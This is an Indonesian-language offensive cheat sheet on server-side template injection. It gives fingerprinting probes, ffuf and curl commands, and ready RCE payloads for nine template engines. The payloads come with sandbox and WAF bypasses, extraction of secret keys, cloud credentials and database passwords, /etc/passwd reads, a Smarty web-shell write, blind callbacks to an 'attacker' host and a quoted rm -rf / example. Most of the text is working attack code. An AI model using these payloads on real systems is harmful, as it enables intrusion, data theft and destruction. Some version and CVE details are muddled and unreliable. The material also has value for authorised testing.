# ssti — web

# SSTI: Referensi Engine, Probe, dan RCE

## 1. Peta Engine & Sintaks Dasar

| Engine | Bahasa | Deteksi Sintaks | Ekspresi Uji | Output Normal |
|---|---|---|---|---|
| Jinja2 | Python | `{{7*7}}` | `{{7*7}}` | `49` |
| Twig | PHP | `{{7*7}}` | `{{7*7}}` | `49` |
| Freemarker | Java | `${7*7}` | `${7*7}` | `49` |
| Velocity | Java | `#set($x=7)` | `#set($x=7*7)$x` | `49` |
| Smarty | PHP | `{7*7}` atau `{$x}` | `{7*7}` / `{math equation="7*7"}` | `49` |
| Pebble | Java | `{{7*7}}` | `{{7*7}}` | `49` |
| ERB | Ruby | `<%= 7*7 %>` | `<%= 7*7 %>` | `49` |
| Handlebars | JS | `{{7*7}}` | `{{7*7}}` — **TIDAK evaluasi**, literal | `{{7*7}}` (gagal) |
| Thymeleaf | Java | `__${...}__` | `__${7*7}__::x` | `49` (butuh preprocessor) |

Aturan cepat:
- `{{7*7}}` = `49` → Jinja2, Twig, Pebble, Nunjucks ambigu; disambiguasi lanjut.
- `{{7*7}}` = literal `{{7*7}}` → Handlebars / Mustache (tidak evaluasi aritmetika).
- `${7*7}` = `49` → Freemarker, JSP EL, Velocity (via `#set`).
- `<%= %>` = `49` → ERB.
- `{7*7}` = `49` → Smarty (default `{` `}`).

## 2. Polyglot Probe

Kirim satu string, cek respons. Urutan prioritas:

```
${{7*7}}{7*7}{{7*7}}<%=7*7%>#{7*7}*{7*7}
```

Payload polyglot multi-engine (kirim ke parameter/header/body yang dirender):

```
{{7*7}}${7*7}#{7*7}<%=7*7%>[%7*7%]{7*7}
```

Hasil pembacaan:
- Muncul `49` satu kali dari `{{7*7}}` saja → Jinja2/Twig/Pebble.
- Muncul `49` dari `${7*7}` → Freemarker/JSP.
- Muncul `49` dari `<%= %>` → ERB.
- Muncul `49` dari `{7*7}` → Smarty.
- Muncul `49` dari `#{7*7}` → Ruby string interpolation (`#{}`) — bukan engine, tapi indikasi Ruby.
- Semua literal → tidak ada evaluasi, kandidat Handlebars/Mustache atau input tidak dirender (XSS reflected biasa).

Probe diferensiasi Jinja2 vs Twig vs Pebble (semua `{{7*7}}=49`):

```
{{7*'7'}}
```
- Jinja2 → `7777777`
- Twig → `49` (string cast, `'7'*7` = 49 aritmetik di Twig)
- Pebble → error / `49`

```
{{'7'*'7'}}
```
- Jinja2 → error (`'7'*'7'` tidak valid)
- Twig → `49`

Probe diferensiasi Jinja2 vs Nunjucks:
```
{{range(0,3)}}       → Jinja2: <range 0..3> ; Nunjucks: error
{{cycler}}           → Jinja2: <class 'jinja2.utils.Cycler'> ; Nunjucks: literal
```

Probe Freemarker vs Velocity:
```
${7*7}      → Freemarker: 49 ; Velocity: literal ${7*7}
#set($x=7*7)$x  → Velocity: 49 ; Freemarker: literal
```

Probe Thymeleaf (sering di Spring):
```
__${T(java.lang.Runtime).getRuntime()}__::x
```
Jika error mengandung `org.thymeleaf` → Thymeleaf aktif.

Perintah shell untuk prober otomatis (ffuf + wordlist polyglot):

```bash
# wordlist payload.txt berisi polyglot di atas
ffuf -u 'https://target/search?q=FUZZ' -w payload.txt -mr '49' -ac
```

```bash
# probe dengan header (sering dirender di error page / email template)
curl -s -H 'X-Template: {{7*7}}' https://target/ | grep -o '49' | head
```

## 3. Payload RCE per Engine

### 3.1 Jinja2 (Python — Flask, Django tidak pakai Jinja2)

Deteksi versi:
```
{{config}}                       → <Config {...}>
{{config.items()}}               → daftar item config
{{self.__class__.__mro__}}       → mro chain
```

RCE klasik:
```
{{''.__class__.__mro__[1].__subclasses__()}}
```
Cari index `subprocess.Popen`:
```
{{''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate()}}
```

Stabil tanpa index (Jinja2 ≥2.11, Python 3):
```
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
```

Bypass blacklist `__`, `os`, `popen`, `class`, `mro`, `subclasses`, `[]`, `.`:
```
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}
```
Atau gunakan `request` global (Flask):
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Bypass `{{ }}` diblok — gunakan `{% %}`:
```
{%print(cycler.__init__.__globals__.os.popen('id').read())%}
```

Jinja2 SandboxedEnvironment bypass (Flask-Babel, beberapa app):
- `SandboxedEnvironment` memblok `__` dan akses atribut internal.
- Bypass umum (CVE-2019-10906, Jinja2 <2.10.1):
```
{{''.__class__.__mro__[1].__subclasses__()[<Popen idx>]}}
```
- Bypass via `format` (Jinja2 <3.0.3, CVE-2024-22195 tidak langsung RCE):
```
{{'{0.__class__}'.format('')}}
```
- Bypass baru Jinja2 3.1.x: tidak ada RCE langsung; cari sink lain (file upload, SSRF).

`__init__.__globals__` jalan karena atribut dunder tidak diblokir di default `Environment`. `SandboxedEnvironment` memblok akses ke atribut yang diawali `_`.

Environment read:
```
{{config}}
{{config.SECRET_KEY}}
{{request.environ}}
{{get_flashed_messages.__globals__.__builtins__.__import__('os').environ}}
```

### 3.2 Twig (PHP — Symfony, Drupal, Bolt)

Deteksi versi:
```
{{_self.env.getLoader()}}        → Twig\Loader\...
{{_self.env.getGlobals()}}
```

Twig 1.x (banyak sink lama):
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Twig 2.x/3.x (Symfony — `filter` tidak expose `env`):
```
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
```

Twig 3.x RCE stabil (Symfony, via `map`+`call`):
```
{{['id']|filter('system')}}
```
(butuh `system` di daftar function yang tidak diblok; default Twig membolehkan PHP functions).

Twig SSTI untuk Drupal 7/8 (Twig 1.38+):
```
{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("id")}}
```

Twig `SandboxExtension` aktif:
- `system`, `exec`, `passthru` diblok.
- Bypass via `{{['id']|filter('system')}}` jika `filter` tidak diblok; jika `filter` diblok, cari `sort`, `map`, `reduce` dengan callback.
- Twig 3.x dengan `sandbox` + `restrict`: hanya fungsi di `allowed_functions` — RCE sulit, alihkan ke file read/Twig `source()`:
```
{{source('/etc/passwd')}}
```

Bypass filter `{{ }}`:
```
{% set x = ['id']|filter('system') %}
{% dump x %}
```

Freemarker, Velocity, Smarty, Pebble, ERB, Handlebars, Thymeleaf — lihat di bawah.

### 3.3 Freemarker (Java — Spring, OFBiz, Liferay)

Deteksi:
```
${7*7}                           → 49
${.version}                      → 2.3.x
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

RCE stabil (Freemarker <2.3.30, dan banyak >2.3.30 dengan `TemplateClassResolver` default):
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

Bypass blokir `Execute` (Freemarker ≥2.3.30 — `TemplateClassResolver.UNRESTRICTED` tidak aktif, tapi `ObjectConstructor` masih bisa):
```
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}
```
```
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("id")</@value>
```

Bypass via `api` builtin (parsing `?api` — butuh `APIBuiltin` di `Freemarker` 2.3.x dengan `api_builtin_enabled=true`):
```
<#assign classloader=Object?api.class.getClassLoader()>${classloader.loadClass("freemarker.template.utility.Execute")?new()("id")}
```

Bypass blacklist string `Execute`/`java.lang` — pakai `${...?new()}` dengan string concat:
```
<#assign x="Exec"+"ute">
<#assign ex="freemarker.template.utility.${x}"?new()>${ex("id")}
```

File read (tanpa RCE):
```
${.data_model}
<#assign x = "freemarker.template.utility.ObjectConstructor"?new()>
${x("java.io.FileReader","/etc/passwd")}
```

Catatan: `spring.view`/`WebApplicationContext` sering tersedia — akses env:
```
${springMacroRequestContext.getBean("environment").getProperty("spring.datasource.password")}
```

### 3.4 Velocity (Java — Spring Velocity, Atlassian)

Deteksi:
```
#set($x=7*7)$x                    → 49
$class.inspect("java.lang.Runtime")  → jika `$class` tersedia
```

RCE (classic, Velocity 1.x/2.x dengan `Runtime` di context):
```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

Variasi pendek (Velocity 2.x, `$class` tools):
```
#set($e="e")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```
(umumnya gagal tanpa `$e` runtime — butuh `Runtime` di context; gunakan versi panjang).

Bypass blokir `Runtime`:
```
#set($s="")#set($r=$s.class.forName("java.lang.Run"+"time"))...
```

File read:
```
#set($f=$s.class.forName("java.io.FileReader"))#set($r=$f.getConstructor($s.class.forName("java.lang.String")).newInstance("/etc/passwd"))#set($br=$s.class.forName("java.io.BufferedReader").getConstructor($s.class.forName("java.io.Reader")).newInstance($r))...
```

Velocity tool-class (`ToolManager`) sering expose `$date`, `$math`, `$list` — bukan RCE langsung.

### 3.5 Smarty (PHP — PrestaShop, OsCommerce)

Deteksi:
```
{7*7}                            → 49
{$smarty.version}                → 3.x
```

RCE Smarty 2.x:
```
{php}echo `id`;{/php}
```
(Blok `{php}` dihapus di Smarty 3.)

Smarty 3.x RCE (via `{system()}` jika `SmartyBC` aktif):
```
{system('id')}
{/system}
```

RCE stabil Smarty 3.x:
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```
Lalu `?cmd=id`.

Bypass `{` `}` filter → gunakan `{literal}`:
```
{literal}{system('id')}{/literal}
```
(jika filter hanya regex `{...}` di luar literal).

File read:
```
{include file="/etc/passwd"}
```

Env:
```
{$smarty.const.PHP_VERSION}
{$smarty.server.REMOTE_ADDR}
{$smarty.env.PATH}
```

### 3.6 Pebble (Java — Spring Pebble, SpringBoot)

Deteksi:
```
{{7*7}}                          → 49
{{'a'|upper}}                    → A
```

RCE Pebble 2.x (<3.1.2 — CVE-2024-XXXX tidak ada; Pebble umumnya aman dari RCE via sandbox):
Pebble 2.x tidak punya sink RCE bawaan. Namun bila `PebbleTemplate` dibuat dengan `addExtension(new SpringExtension())`, ada jalur SSRF/file read via `{{ beans }}`:
```
{{ beans['dataSource'].connection.metaData.getURL() }}
```

Pebble 3.x dengan `SpringExtension` di Spring Boot:
```
{{ beans['environment'].getProperty('spring.datasource.password') }}
```

Bypass via `getClass` (Pebble 3.x tidak memblok `getClass`):
```
{{ beans['x'].getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```
Jika `getClass` diblok, coba `{{ beans['x'].class }}` (tidak valid Pebble) — umumnya Pebble sandbox aman; alihkan ke `{{ beans[...] }}` untuk exposure.

### 3.7 ERB (Ruby — Rails view, Sinatra, Puppet)

Deteksi:
```
<%= 7*7 %>                       → 49
<%= RUBY_VERSION %>              → 3.x.x
```

RCE:
```
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

Bypass filter `<%= %>` (jika dihapus) — gunakan `<% %>`:
```
<% system('id') %>
```

Rails ERB dengan `sanitize` — ERB tidak disandbox by default; jika `<%= %>` diblok, coba `<%=` dengan spasi/`<%=` newline:
```
<%=
system('id')
%>
```

Env:
```
<%= ENV['PATH'] %>
<%= Rails.application.config %>
```

ERB di Puppet (server) — payload masuk ke template Puppet, eksekusi sebagai user `puppet` (root sering):
```
<%= scope.lookupvar('::fqdn') %>
<%= `id` %>
```

### 3.8 Handlebars (JS — Node.js, Express view engine)

Handlebars **tidak mengevaluasi JS**. `{{7*7}}` = literal. RCE hanya jika:
1. `Handlebars.compile` dengan `allowProtoMethodsByDefault` / `allowProtoPropertiesByDefault` dimatikan, atau
2. App memakai `handlebars` + `express-handlebars` dengan helper kustom yang tidak aman.

Cek versi Handlebars:
```
{{#each (lookup . 'constructor')}}{{/each}}   → error vs jalan
```

Handlebars <4.0.0 (CVE-2019-19919, prototype pollution):
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
(Versi <4.0.0; output `id`.)

Handlebars 4.x aman dari SSTI murni. Jika app pakai `express-handlebars` + helper `custom` yang memanggil `eval`, eksploitasi lewat helper tersebut, bukan engine.

Handlebars dengan `handlebars.compile` + `helpers: {log: ...}` — tidak RCE.

**Kesimpulan:** jika `{{7*7}}` literal, hentikan SSTI, alihkan ke XSS/path traversal. Jangan buang waktu payload RCE Handlebars di versi 4.x.

### 3.9 Thymeleaf (Java — Spring Boot)

Deteksi:
```
__${7*7}__::x                    → 49 (butuh preprocessor)
${7*7}                           → 49 (Spring EL, bukan Thymeleaf murni)
```

Thymeleaf 3.x RCE (Spring Boot 1.x/2.x, `spring-boot-starter-thymeleaf`):
```
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```
Untuk blind (tanpa output — `exec` return `Process`, tidak dieksekusi `.waitFor()`):
```
__${T(java.lang.Runtime).getRuntime().exec('curl http://attacker/x')}__::.x
```
Atau SpEL `ProcessBuilder`:
```
__${new java.lang.ProcessBuilder('id').start()}__::.x
```

Baca output RCE (SpEL, Spring Boot, `T()` tersedia):
```
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('id')}
```
(`exec` mengembalikan `Process` — untuk output, gunakan `ProcessBuilder` + `InputStream`:
```
__${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()))}__::.x
```

Bypass filter `T(`, `Runtime`, `__${`:
- SpEL di Thymeleaf memblok `T(` jika `spring.expression` — coba `${...}` biasa (Spring EL tanpa Thymeleaf preprocessor) jika app meneruskan input ke `expressionParser`.
- Bypass via `Session`/`RequestContext`:
```
${#request.getSession().getServletContext()}
```

File read:
```
__${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File)('/etc/passwd'))}__::.x
```

Env (Spring):
```
${@environment.getProperty('spring.datasource.password')}
```
(SpEL bean reference `@environment` — jalan bila `StandardEvaluationContext` dengan bean resolver.)

Thymeleaf 3.0.12+ / Spring Boot 2.4+ membatasi `T(` dan `@`; jika error `Instantiation of new objects and access to static classes is forbidden`, cari sink alternatif (path traversal `spring.view.prefix`, SSRF via `@environment`).

## 4. Akses Config/Env per Engine

| Engine | Payload | Output |
|---|---|---|
| Jinja2 | `{{config}}` | `<Config {'DEBUG': False, ...}>` |
| Jinja2 | `{{config['SECRET_KEY']}}` | `dev-secret` |
| Jinja2 | `{{request.environ['AWS_SECRET_ACCESS_KEY']}}` | value |
| Twig | `{{app.request.server.get('AWS_SECRET_ACCESS_KEY')}}` (Symfony) | value |
| Twig | `{{dump(_context)}}` (jika `dump` ext) | seluruh context |
| Freemarker | `${.data_model}` | map seluruh data model |
| Freemarker | `${springMacroRequestContext.getBean("environment").getProperty("DB_PASSWORD")}` | value |
| Velocity | `$context` / `$springMacroRequestContext` | bean context |
| Smarty | `{$smarty.env.AWS_SECRET_ACCESS_KEY}` | value |
| Smarty | `{$smarty.server.HTTP_HOST}` | value |
| Pebble | `{{ beans['environment'].getProperty('DB_PASSWORD') }}` | value |
| ERB | `<%= ENV['AWS_SECRET_ACCESS_KEY'] %>` | value |
| ERB | `<%= Rails.application.credentials.secret_key_base %>` | value |
| Thymeleaf | `${@environment.getProperty('DB_PASSWORD')}` | value |
| Thymeleaf | `${T(java.lang.System).getenv()}` | map env |

## 5. File Read per Engine

| Engine | Payload | Catatan |
|---|---|---|
| Jinja2 | `{{lipsum.__globals__.__builtins__.open('/etc/passwd').read()}}` | Py3, `open` di builtins |
| Jinja2 | `{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}` | fallback |
| Twig | `{{source('/etc/passwd')}}` | butuh `source` function tidak dimatikan |
| Twig | `{{include('/etc/passwd')}}` | jika `include` tidak diblok |
| Freemarker | `<#assign x="freemarker.template.utility.ObjectConstructor"?new()>${x("java.io.FileReader","/etc/passwd")}` | + baca via `BufferedReader` |
| Freemarker | `<#include "/etc/passwd">` | hanya jika `TemplateLoader` mengizinkan |
| Velocity | via `FileReader`/`BufferedReader` (lihat 3.4) | verbose |
| Smarty | `{include file="/etc/passwd"}` | bergantung `template_dir` |
| Pebble | `{{ beans['x']... }}` | tidak ada file read murni; via `getClass` |
| ERB | `<%= File.read('/etc/passwd') %>` | langsung |
| ERB | `<%= IO.read('/etc/passwd') %>` | alternatif |
| Thymeleaf | `${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File)('/etc/passwd'))}` | butuh commons-io |
| Thymeleaf | `__${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd',T(java.lang.String[]).class))}__::x` | JDK-only |

## 6. Membedakan SSTI dari XSS Sisi Server

| Aspek | SSTI | XSS (server-side render) |
|---|---|---|
| Payload uji | `{{7*7}}` → `49` | `{{7*7}}` → literal atau `<script>alert(1)</script>` |
| Refleksi | Output berubah di **body/response** setelah evaluasi | Output HTML terkirim apa adanya |
| Escape | Tidak di-escape engine (kecuali autoescape — lalu cek `{{7*7}}` masih `49` di dalam `&lt;`) | Di-escape (`&lt;script&gt;`) atau dijalankan di klien |
| Perbedaan kunci | `{{7*7}}` menghasilkan `49` bahkan di dalam `<pre>`, atribut HTML, JSON — karena evaluasi di server sebelum escape | `{{7*7}}` tetap literal; `<script>` di-escape atau dijalankan di browser |
| Konteks | Template dieksekusi server → bisa RCE, file read | Dieksekusi browser klien |
| Deteksi final | Kirim `{{7*'7'}}` → `7777777` (Jinja2) = bukti evaluasi server; atau `${7*7}` di header/cookie → `49` | Kirim `<img src=x onerror=alert(1)>` → dijalankan di browser, tidak di server |

Kesalahan umum di lapangan:
- Menyimpulkan SSTI karena `{{7*7}}` muncul di response — padahal input di-reflect mentah. Cek apakah `49` atau `{{7*7}}`.
- Mengira autoescape mematikan SSTI — autoescape HTML hanya me-escape output, evaluasi tetap jalan. `{{7*7}}` di template Jinja2 dengan `autoescape=True` tetap output `49` (bukan `{{7*7}}`).
- Menguji di parameter yang di-render engine JSON (bukan HTML) — escape `\u003c` bukan bukti XSS, tapi `49` tetap bukti SSTI.
- Mengabaikan bahwa XSS di template engine sering berujung SSTI jika input masuk ke **template source**, bukan **context**. Bedakan: `render_template_string(input)` = SSTI; `render_template('x.html', name=input)` = XSS (input jadi context, di-escape).

## 7. Jebakan Operasional (Field)

1. **Autoescape bukan penangkal SSTI.** `render_template_string(user)` dengan `autoescape=True` tetap evaluasi `{{7*7}}` → `49`. Banyak tester berhenti karena melihat `&lt;` di output.

2. **`{{7*7}}` di-reflect mentah ≠ tidak SSTI.** Bisa jadi engine bukan Jinja2/Twig/Pebble. Uji polyglot `${7*7}`, `<%=7*7%>`, `{7*7}`, `#{7*7}` sebelum menyimpulkan.

3. **Handlebars 4.x bukan target RCE.** `{{7*7}}` literal. Jangan kirim payload CVE-2019-19919 — gagal di 4.x. Cek `package.json`/`{{@root}}` untuk versi, atau hentikan.

4. **Thymeleaf butuh preprocessor `__${...}__::x`.** `${7*7}` di Spring hanya membuktikan Spring EL, bukan Thymeleaf. Jika `__${7*7}__::x` = `49`, baru Thymeleaf. Spring Boot ≥2.4 memblok `T(` dan `@` — cari sink `spring.view.prefix`/`spring.thymeleaf.prefix` (path traversal) daripada RCE.

5. **Freemarker `Execute` diblok sejak 2.3.30 di beberapa setup.** Cek `${.version}` dulu. Fallback `ObjectConstructor` + `ProcessBuilder`, atau `?api` (butuh `api_builtin_enabled=true`, jarang).

6. **Jinja2 `SandboxedEnvironment` memblok `__`.** Payload `__class__` gagal. Coba `|attr('__class__')` (kadang bypass di sandbox lama), atau cari sink lain (upload, SSRF). Jinja2 3.1.x sandbox tidak ada RCE langsung — jangan paksakan.

7. **Twig 3.x + `SandboxExtension` + `restrict`.** `system` diblok. `{{source()}}` untuk file read jika tidak diblok. `{{['id']|filter('system')}}` gagal di sandbox ketat. Cek error: `Calling "system" on a template is not allowed`.

8. **ERB di Rails sering di-`sanitize`.** `<%= %>` dihapus → coba `<% %>` (tag non-output, tetap eksekusi). Jika keduanya dihapus, bukan ERB — cek apakah input masuk ke `render inline:` (Rails `render inline: params[:x]` = SSTI ERB, serius).

9. **Output RCE Java `Runtime.exec` tidak mengembalikan string.** `exec('id')` return `Process` → response kosong. Blind: pakai `curl http://attacker/x` atau `ProcessBuilder` + `StreamUtils`. Kesalahan klasik: menyimpulkan "gagal" karena output kosong.

10. **WAF memblok `{{`, `${`, `__`, `Runtime`, `system`.** Bypass: `{{` dengan `{%print%}`, `__` dengan `|attr`, `Runtime` dengan concat string (`"Run"+"time"`), `${` dengan `<#assign>` di Freemarker. Uji di header (`X-Forwarded-For`, `User-Agent`) yang sering tidak di-WAF tapi dirender ke log/email template.

11. **Input di-`urlencode` sebelum render.** `{{7*7}}` jadi `%7B%7B7%2A7%7D%7D` — tidak dieksekusi. Cek response: jika `{{7*7}}` muncul (bukan `49`), decode tidak terjadi. Uji di body `application/json` (bukan form) yang lebih jarang di-encode.

12. **SSTI di email template / PDF generator.** Sering async — response HTTP kosong. Blind: kirim `{{7*'7'}}` lalu cek inbox/S3 untuk `7777777`, atau RCE blind ke collaborator.

13. **Versi engine ≠ versi framework.** Symfony 5 + Twig 2.14 vs Twig 3.3 beda payload. Cek `${.version}`/`{{_self.env}}`/`$smarty.version`/`RUBY_VERSION` dulu, jangan tebak.

14. **Polyglot bisa false positive.** `{{7*7}}` = `49` di halaman yang memang berisi `49` (harga, ID). Bandingkan baseline: request dengan `{{7*8}}` → harus `56`, bukan `49` statis. Selalu uji dua nilai berbeda.

15. **Thymeleaf di Spring Boot 3.x (Spring 6).** `T()` diblok total (`Instantiation of new objects and access to static classes is forbidden`). Fokus ke `${@environment}` (jika bean resolver aktif) atau path traversal, bukan RCE.

16. **Velocity `$x.class` butuh `$x` non-null di context.** Di context kosong, `#set($x='')` bikin `$x` string kosong — `''.class` di Velocity 2.x = `String.class` (ok), di 1.x gagal. Cek `${velocity.version}`.

17. **Smarty `{php}` dihapus di Smarty 3.** `{system()}` butuh `SmartyBC` (`$smarty->bcEnabled`). Cek `{$smarty.version}` — jika 3.x tanpa BC, pakai `Smarty_Internal_Write_File::writeFile` (butuh `writeFile` tidak diblok) atau `{include file=...}` untuk file read.

18. **Jangan kirim payload destruktif saat uji.** `{{lipsum.__globals__.os.popen('rm -rf /').read()}}` di prod = insiden. Gunakan `id`, `whoami`, `curl` ke collaborator, atau `sleep 5` untuk konfirmasi blind sebelum RCE nyata.

---

## [reasoning trace]


